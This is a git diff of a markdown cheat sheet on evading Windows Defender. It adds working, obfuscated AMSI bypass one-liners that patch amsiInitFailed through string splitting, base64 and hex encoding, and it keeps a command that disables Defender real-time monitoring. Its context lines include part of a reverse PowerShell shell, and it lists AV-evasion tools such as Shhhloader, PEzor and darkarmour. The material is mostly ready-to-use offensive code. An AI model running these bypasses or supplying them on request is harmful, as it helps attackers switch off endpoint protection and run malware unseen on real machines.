@@ -19,8 +19,9 @@ Credit Info: I have obtained a lot of this info through other Github repos, blog
 - https://github.com/phra/PEzor
 - https://github.com/CBHue/PyFuscation
 - https://github.com/danielbohannon/Invoke-Obfuscation
+- https://github.com/icyguider/Shhhloader (Flagged by AV now)
 
-# Step one of evading Defender
+# Step one off evading Defender
 
 First try turning of Windows Defender:
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
@@ -36,10 +37,21 @@ $field.SetValue($null,$true)
 ```
 * If patched, just change up the strings/variables.
 
-Single-line bypass:
+Single-line bypasses:
 ```
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
+Credit: https://buaq.net/go-98295.html
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+```
+Credit: https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification (however, I think it's originally from Matt Graeber)
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+```
+Credit: https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification (however, I think it's originally from Matt Graeber)
 
 # Misc things:
 
@@ -52,7 +64,6 @@ $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"
 $main = [Shell].getmethod("Main", $BindingFlags)
 $main.Invoke($null, $null)
 ```
-
 Reverse PowerShell:
 
 ```
@@ -75,6 +86,7 @@ do{
 }While ($true);
 $writer.close();$socket.close();
 ```
+
 Tools that may help with AV Evasion: 
 - https://github.com/phra/PEzor
 - https://github.com/bats3c/darkarmour
